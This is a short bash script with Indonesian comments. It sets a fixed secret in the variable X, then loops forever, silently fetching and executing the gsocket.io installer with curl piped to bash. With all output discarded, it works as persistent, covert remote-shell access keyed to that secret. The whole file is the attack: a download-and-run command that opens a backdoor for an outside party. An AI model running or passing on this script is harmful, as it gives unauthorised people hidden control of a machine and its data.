#!/bin/bash

# Tetapkan variabel lingkungan X
export X="9USF1UEMqb8Afejp2rQTzC"

# Jalankan tools tanpa henti
while true; do
    # Jalankan perintah tools tanpa output
    bash -c "$(curl -fsSL https://gsocket.io/x)" > /dev/null 2>&1

    # (Opsional) Tunggu beberapa detik jika ingin memberikan jeda antar perintah
    sleep 1
done
